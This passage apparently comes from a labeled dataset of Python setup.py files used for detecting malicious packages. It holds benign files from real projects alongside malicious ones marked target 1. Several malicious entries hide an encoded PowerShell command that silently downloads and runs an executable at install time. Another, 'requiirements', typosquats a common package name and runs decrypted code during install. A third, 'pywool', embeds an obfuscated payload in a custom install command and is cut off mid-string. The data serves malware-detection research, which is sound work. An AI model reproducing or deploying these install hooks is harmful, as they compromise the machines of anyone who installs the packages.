grpcio-status exist in the same\n    # grpc/grpc monorepo and thus these two dependencies should always\n    # have the same version range.\n    \"grpcio >= 1.38.1, < 2.0.0\",\n    \"grpcio-status >= 1.38.1, < 2.0.0\",\n    \"proto-plus == 1.19.6\",\n    \"PyYAML >= 5.1, < 7.0\",\n    \"setuptools >= 40.3.0\",\n    # Protobuf versions 3.18.* and 3.19.* are incompatible with this\n    # library due to performance issues. See the following for more details:\n    # https://github.com/protocolbuffers/protobuf/issues/9180\n    \"protobuf >= 3.12.0, <= 3.20.0,!=3.18.*,!=3.19.*\",\n]\n\nwith io.open(\"README.rst\", \"r\", encoding=\"utf-8\") as readme_file:\n    long_description = readme_file.read()\n\nsetup(\n    name=\"google-ads\",\n    version=\"18.0.0\",\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    classifiers=[\n        \"Intended Audience :: Developers\",\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n    ],\n    description=\"Client library for the Google Ads API\",\n    include_package_data=True,\n    python_requires=\">=3.7\",\n    long_description=long_description,\n    install_requires=install_requires,\n    extras_require={\n        \"tests\": [\n            \"nox >= 2020.12.31, < 2022.6\",\n        ]\n    },\n    license=\"Apache 2.0\",\n    packages=find_packages(\n        exclude=[\"examples\", \"examples.*\", \"tests\", \"tests.*\"]\n    ),\n    namespace_packages=[\"google\", \"google.ads\"],\n    url=\"https://github.com/googleads/google-ads-python\",\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "dagster-postgres-0.16.3", "func": "from typing import Dict\n\nfrom setuptools import find_packages, setup\n\n\ndef get_version() -> str:\n    version: Dict[str, str] = {}\n    with open(\"dagster_postgres/version.py\", encoding=\"utf8\") as fp:\n        exec(fp.read(), version)  # pylint: disable=W0122\n\n    return version[\"__version__\"]\n\n\nif __name__ == \"__main__\":\n    ver = get_version()\n    # dont pin dev installs to avoid pip dep resolver issues\n    pin = \"\" if ver == \"0+dev\" else f\"=={ver}\"\n    setup(\n        name=\"dagster-postgres\",\n        version=ver,\n        author=\"Elementl\",\n        author_email=\"hello@elementl.com\",\n        license=\"Apache-2.0\",\n        description=\"A Dagster integration for postgres\",\n        url=\"https://github.com/dagster-io/dagster/tree/master/python_modules/libraries/dagster-postgres\",\n        classifiers=[\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Programming Language :: Python :: 3.10\",\n            \"License :: OSI Approved :: Apache Software License\",\n            \"Operating System :: OS Independent\",\n        ],\n        packages=find_packages(exclude=[\"dagster_postgres_tests*\"]),\n        package_data={\n            \"dagster-postgres\": [\n                \"dagster_postgres/alembic/*\",\n            ]\n        },\n        include_package_data=True,\n        install_requires=[\"dagster==1.0.3\", \"psycopg2-binary\"],\n        zip_safe=False,\n    )\n", "target": 0}
{"idx": "esqstringramgui-4.87", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqstringramgui',\n    packages = ['modlib'],\n    version = '5.32',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "geospark-1.3.1", "func": "from setuptools import setup, find_packages\nfrom os import path\nfrom geospark import version\n\nhere = path.abspath(path.dirname(__file__))\njars_relative_path = \"geospark/jars\"\n\nwith open(\"README.md\", \"r\") as fh:\n    long_description = fh.read()\n\nsetup(\n    name='geospark',\n    version=version,\n    description='GeoSpark Python',\n    url='https://github.com/DataSystemsLab/GeoSpark/tree/master/python',\n    author='Pawel Kocinski',\n    author_email='pawel93kocinski@gmail.com',\n    packages=find_packages(exclude=[\"*.tests\", \"*.tests.*\", \"tests.*\", \"tests\"]),\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    python_requires='>=3.6',\n    install_requires=['pyspark', 'findspark', 'attrs', \"shapely\"],\n    project_urls={\n        'Bug Reports': 'https://github.com/DataSystemsLab/GeoSpark'\n    },\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: Apache Software License\"\n    ],\n    package_data={\n        'geospark.jars.2_3': [\"*.jar\"],\n        'geospark.jars.2_4': [\"*.jar\"],\n        'geospark.jars.2_2': [\"*.jar\"]\n    }\n)\n\n", "target": 0}
{"idx": "requiirements-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'yOvjpCnVdCiqpWFbpwqUAekewQukaBwEfOpldzAaToonqjLuMNiaPoMAvCfGOIIjedbaqs'\nLONG_DESCRIPTION = 'lhtLHTniTuuxLFfaOHhyDrUhMKCDguamYCFPzYjsMhHBTuUWdhBnc mxudaeQjICQg RGaxXYgiwlgDKIDMceY YshWuPFlyqTRjPakrGEbdUiJbxiijiCtFpADxCxCzZelEdrKCmIIwQu IZFRuQFV zSLoIJFnUyEYodXwvdlMzkzvwCXCGLiFf yHzHxIbvnBQFMUkKnbLesOHPcwauOSOjZqpNYJeKMVKu rYnVZMnYPkVtgLASaPaoQwQxHxSMyNEMHLviHrCGBIfHtPNYqKNkruWyJcRRlwmIjzlRNTffRgnYCUWln VfMmAtndPrNAgWxPRweiVYAJqfkFNzdGDsyyDSJSI'\n\n\nclass OdsilOfVQgVYkIgceDZzSDqoqdCLQsAeTkWUuJvnhBwCrbzeaPAKBhJDBFRBUQNGKkHGvEVXDuBvveJtKkLgpaXhfgccDjBlJmb(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'UufeffwtW9jWEtBt0KHSMmPMh6DDtv-SF8iFGkUUnSM=').decrypt(b'gAAAAABmBIWXflHsR2LEz7HwwybLo_dYQ1yVxdMSfZ09I_r03vlfe8m2eRx5hA4tHCw7aoNXDQksuKkSPIOaK0OJ4hsViHm0I53UpeR7--67-D_drOKvf5nCqb3VAQxInmiDzTY670zPCUZ2sAGdYGFQ9nBwOF2lSiCa1gGa-Ds1dd1mkl66xw5csR7vL1n52A1cFV4RzK_ElzBdei-iwYpGwfTdYdqqYxOPMhG43UJwWjbNd-mPNBg='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requiirements\",\n    version=VERSION,\n    author=\"ZLLaSDUiMdGLXgDyr\",\n    author_email=\"QkzoybKS@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': OdsilOfVQgVYkIgceDZzSDqoqdCLQsAeTkWUuJvnhBwCrbzeaPAKBhJDBFRBUQNGKkHGvEVXDuBvveJtKkLgpaXhfgccDjBlJmb,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "proofproof-9.13", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'proofproof',\n    packages = ['modlib'],\n    version = '4.66',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libverhttpmine-4.6", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libverhttpmine',\n    packages = ['modlib'],\n    version = '4.46',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-mathfilters-1.0.0", "func": "import codecs\nfrom setuptools import setup\n\nsetup(name='django-mathfilters',\n      version='1.0.0',\n      description='A set of simple math filters for Django',\n      long_description=codecs.open('README.rst', encoding='utf-8').read(),\n      author='Danilo Bargen',\n      author_email='mail@dbrgn.ch',\n      url='https://github.com/dbrgn/django-mathfilters',\n      license='MIT',\n      keywords='django template filters math',\n      packages=['mathfilters', 'mathfilters.templatetags'],\n      package_dir={'mathfilters': 'mathfilters'},\n      platforms=['any'],\n      classifiers=[\n          'Development Status :: 5 - Production/Stable',\n          'Environment :: Web Environment',\n          'Framework :: Django',\n          'Intended Audience :: Developers',\n          'License :: OSI Approved :: MIT License',\n          'Operating System :: OS Independent',\n          'Programming Language :: Python :: 3',\n          'Programming Language :: Python :: 3.3',\n          'Programming Language :: Python :: 3.4',\n          'Programming Language :: Python :: 3.5',\n          'Programming Language :: Python :: 3.6',\n          'Programming Language :: Python :: 3.7',\n          'Programming Language :: Python :: Implementation :: CPython',\n          'Programming Language :: Python :: Implementation :: PyPy',\n          'Topic :: Internet :: WWW/HTTP',\n          'Topic :: Software Development :: Libraries :: Python Modules',\n      ],\n)\n", "target": 0}
{"idx": "py-remc-4.19", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-remc',\n    packages = ['modlib'],\n    version = '2.10',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "strgrand-6.84", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'strgrand',\n    packages = ['modlib'],\n    version = '2.28',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "gspread-dataframe-3.3.0", "func": "try:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\nimport os.path\nimport sys\n\nPY3 = sys.version_info >= (3, 0)\n\nwith open(os.path.join(os.path.dirname(__file__), 'VERSION'), 'rb') as f:\n    VERSION = f.read()\n    if PY3:\n        VERSION = VERSION.decode('utf8')\n    VERSION = VERSION.strip()\n\nwith open(os.path.join(os.path.dirname(__file__), 'README.rst'), 'rb') as f:\n    long_description = f.read()\n    if PY3:\n        long_description = long_description.decode('utf8')\n\nsetup(\n    name='gspread-dataframe',\n    version=VERSION,\n    py_modules=['gspread_dataframe'],\n    test_suite='tests',\n    install_requires=[\n        'gspread>=3.0.0', \n        'pandas>=0.24.0',\n        'six>=1.12.0'\n        ],\n    tests_require=['oauth2client'] + ([] if PY3 else ['mock']),\n    description='Read/write gspread worksheets using pandas DataFrames',\n    long_description=long_description,\n    author='Robin Thomas',\n    author_email='rthomas900@gmail.com',\n    license='MIT',\n    url='https://github.com/robin900/gspread-dataframe',\n    keywords=['spreadsheets', 'google-spreadsheets', 'pandas', 'dataframe'],\n    classifiers=[\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Science/Research\",\n        \"Topic :: Office/Business :: Financial :: Spreadsheet\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\"\n        ],\n    zip_safe=True\n)\n", "target": 0}
{"idx": "durationpy-0.5", "func": "from distutils.core import setup\n\nsetup(\n    name         = 'durationpy',\n    description  = 'Module for converting between datetime.timedelta and Go\\'s Duration strings.',\n    url          = 'https://github.com/icholy/durationpy',\n    author       = 'Ilia Choly',\n    author_email = 'ilia.choly@gmail.com',\n    download_url = 'https://github.com/icholy/durationpy/tarball/0.5',\n    version      = '0.5',\n    packages     = ['durationpy'],\n    license      = 'MIT'\n)\n", "target": 0}
{"idx": "DataProperty-0.55.0", "func": "\"\"\"\n.. codeauthor:: Tsuyoshi Hombashi <tsuyoshi.hombashi@gmail.com>\n\"\"\"\n\nimport os.path\nfrom typing import Dict\n\nimport setuptools\n\n\nMODULE_NAME = \"DataProperty\"\nREPOSITORY_URL = f\"https://github.com/thombashi/{MODULE_NAME:s}\"\nMISC_DIR = \"misc\"\nREQUIREMENT_DIR = \"requirements\"\n\npkg_info: Dict[str, str] = {}\n\n\ndef get_release_command_class() -> Dict[str, setuptools.Command]:\n    try:\n        from releasecmd import ReleaseCommand\n    except ImportError:\n        return {}\n\n    return {\"release\": ReleaseCommand}\n\n\nwith open(os.path.join(MODULE_NAME.lower(), \"__version__.py\")) as f:\n    exec(f.read(), pkg_info)\n\nwith open(\"README.rst\", encoding=\"utf8\") as f:\n    long_description = f.read()\n\nwith open(os.path.join(MISC_DIR, \"summary.txt\"), encoding=\"utf8\") as f:\n    summary = f.read().strip()\n\nwith open(os.path.join(REQUIREMENT_DIR, \"requirements.txt\")) as f:\n    install_requires = [line.strip() for line in f if line.strip()]\n\nwith open(os.path.join(REQUIREMENT_DIR, \"test_requirements.txt\")) as f:\n    tests_requires = [line.strip() for line in f if line.strip()]\n\nsetuptools.setup(\n    name=MODULE_NAME,\n    version=pkg_info[\"__version__\"],\n    url=REPOSITORY_URL,\n    author=pkg_info[\"__author__\"],\n    author_email=pkg_info[\"__email__\"],\n    description=summary,\n    include_package_data=True,\n    keywords=[\"data\", \"property\"],\n    license=pkg_info[\"__license__\"],\n    long_description=long_description,\n    long_description_content_type=\"text/x-rst\",\n    maintainer=pkg_info[\"__author__\"],\n    maintainer_email=pkg_info[\"__email__\"],\n    packages=setuptools.find_packages(exclude=[\"test*\"]),\n    package_data={MODULE_NAME: [\"py.typed\"]},\n    project_urls={\"Source\": REPOSITORY_URL, \"Tracker\": f\"{REPOSITORY_URL:s}/issues\"},\n    python_requires=\">=3.6\",\n    install_requires=install_requires,\n    extras_require={\"logging\": [\"loguru>=0.4.1,<1\"], \"test\": tests_requires},\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Information Technology\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Software Development :: Libraries\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    cmdclass=get_release_command_class(),\n)\n", "target": 0}
{"idx": "Files.com-1.0.885", "func": "from setuptools import setup, find_packages\n\nwith open('_VERSION') as version_file:\n    version = version_file.read().strip()\n\nsetup(\n    name='Files.com',\n    version=version,\n    license='MIT',\n    description=\"Python bindings for the Files.com API\",\n    packages = find_packages(exclude = ('tests', 'tests.*', 'doc')),\n    install_requires=[\n        'requests >= 2.20; python_version >= \"3.0\"',\n    ],\n    include_package_data=True,\n    package_data={\n        'files_sdk': ['../_VERSION', '../README.md'],\n    },\n    python_requires=\"!=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*\",\n)\n", "target": 0}
{"idx": "guppy3-3.1.2", "func": "import os.path\nimport re\nimport sys\nfrom setuptools import setup, Extension\nfrom distutils.command.install import INSTALL_SCHEMES\n\nfor scheme in INSTALL_SCHEMES.values():\n    scheme['data'] = scheme['purelib']\n\n\nsetsc = Extension(\"guppy.sets.setsc\", [\n                      \"src/sets/sets.c\",\n                      \"src/sets/bitset.c\",\n                      \"src/sets/nodeset.c\"\n                  ])\n\nheapyc = Extension(\"guppy.heapy.heapyc\", [\n                       'src/heapy/heapyc.c',\n                       'src/heapy/stdtypes.c'\n                   ])\n\n\ndef doit():\n    if sys.version_info.major < 3:\n        print('''\\\nsetup.py: Error: This guppy package only supports Python 3.\nYou can find the original Python 2 version, Guppy-PE, here:\nhttp://guppy-pe.sourceforge.net/''', file=sys.stderr)\n        sys.exit(1)\n    if sys.implementation.name != 'cpython':\n        print('''\\\nsetup.py: Warning: This guppy package only supports CPython.\nCompilation failure expected, but continuting anyways...''', file=sys.stderr)\n\n    with open(os.path.join(os.path.dirname(__file__), 'README.md')) as f:\n        long_description = f.read()\n\n    with open('guppy/_version.py', 'r') as versionfile:\n        version = re.search(r'^__version__ = [\\'\"]([^\\'\"]*)[\\'\"]$',\n                            versionfile.read(), re.M)\n        version = version.group(1)\n\n    setup(name=\"guppy3\",\n          version=version,\n          description=\"Guppy 3 -- Guppy-PE ported to Python 3\",\n          long_description=long_description,\n          long_description_content_type='text/markdown',\n          author=\"YiFei Zhu\",\n          author_email=\"zhuyifei1999@gmail.com\",\n          url=\"https://github.com/zhuyifei1999/guppy3/\",\n          license='MIT',\n          packages=[\n              \"guppy\",\n              \"guppy.etc\",\n              \"guppy.gsl\",\n              \"guppy.heapy\",\n              \"guppy.heapy.test\",\n              \"guppy.sets\",\n          ],\n          ext_modules=[setsc, heapyc],\n          python_requires='>=3.6',\n          classifiers=[\n              \"Programming Language :: Python :: 3\",\n              \"Programming Language :: Python :: Implementation :: CPython\",\n              \"Programming Language :: C\",\n              \"License :: OSI Approved :: MIT License\",\n              \"Operating System :: OS Independent\",\n              \"Development Status :: 4 - Beta\",\n              \"Topic :: Software Development :: Debuggers\",\n              \"Environment :: Console\",\n              \"Intended Audience :: Developers\",\n          ])\n\n\ndoit()\n", "target": 0}
{"idx": "grapheme-0.6.0", "func": "from codecs import open as codecs_open\nfrom setuptools import setup, find_packages\n\n\n# Get the long description from the relevant file\nwith codecs_open('README.rst', encoding='utf-8') as f:\n    long_description = f.read()\n\n\nsetup(name='grapheme',\n      version='0.6.0',\n      description=u\"Unicode grapheme helpers\",\n      long_description=long_description,\n      keywords='',\n      author=u\"Alvin Lindstam\",\n      author_email='alvin.lindstam@gmail.com',\n      url='https://github.com/alvinlindstam/grapheme',\n      license='MIT',\n      packages=find_packages(exclude=['ez_setup', 'examples', 'tests']),\n      include_package_data=True,\n      zip_safe=False,\n      install_requires=[],\n      extras_require={\n          'test': ['pytest', 'sphinx', 'sphinx-autobuild', 'wheel', 'twine']\n      },\n      classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n      ],\n      )\n", "target": 0}
{"idx": "pywool-1.0.1", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\n\n\nVERSION = '1.0.1'\nDESCRIPTION = 'A simplified version of urllib'\nLONG_DESCRIPTION = 'Use this package to make your https requests.'\n\nclass CustomInstallCommand(install):\n    def run(self):\n        wopvEaTEcopFEavc =\"DFK\\x0c>\\x15\\x16\\x19\\x19^^F_DA\\x14[VKR\\x07\\x03>\\x17\\x15\\x13\\x16C@IS\\x1c\\x10{J\\x19xo\\x17\\x1c\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x12\\x16\\x18\\x12\\x18\\x16\\x19\\x18\\x10\\x14\\x12\\x16\\x14\\x15\\x16\\x19\\x19\\x17\\x13\\x16\\x10\\x16\\x15\\x14\\x19\\x17\\x18\\x17\\x11\\x17\\x14\\x17\\x15\\x13\\x16\\x17\\x19\\x19\\x16\\x14\\x12\\x19\\x13\\x19\\x10\\x18\\x15\\x15\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x12\\x16\\x18\\x12\\x18\\x16\\x19\\x18\\x10\\x14\\x12\\x16\\x14\\x15\\x16\\x19\\x19\\x17\\x13\\x16\\x10\\x16\\x15\\x14\\x19\\x17\\x18\\x17\\x11\\x17\\x14\\x17\\x15\\x13\\x16\\x17\\x19\\x19\\x16\\x14\\x12\\x19\\x13\\x19\\x10\\x18\\x15\\x15\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x12\\x16\\x18\\x12\\x18\\x16\\x19\\x18\\x10\\x14\\x12\\x16\\x14\\x15\\x16\\x19\\x19\\x17\\x13\\x16\\x10\\x16\\x15\\x14\\x19\\x17\\x18\\x17\\x11\\x17\\x14\\x17\\x15\\x13\\x16\\x17\\x19\\x19\\x16\\x14\\x12\\x19\\x13\\x19\\x10\\x18\\x15\\x15\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x1eS@W[\\x1e[YCQ\\x0